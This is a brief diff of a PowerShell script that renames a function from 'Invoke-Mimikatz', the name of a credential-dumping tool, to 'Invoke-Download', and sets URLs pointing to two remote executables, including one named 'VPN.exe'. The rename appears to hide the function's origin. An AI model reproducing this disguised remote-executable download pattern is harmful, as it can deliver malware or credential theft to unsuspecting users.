@@ -1,5 +1,5 @@
 
-function Invoke-Mimikatz
+function Invoke-Download
 {
   $url1 = "https://raw.githubusercontent.com/foryou123/sectest/master/_59539.exe"
   $url2 = "https://raw.githubusercontent.com/foryou123/sectest/master/VPN.exe"
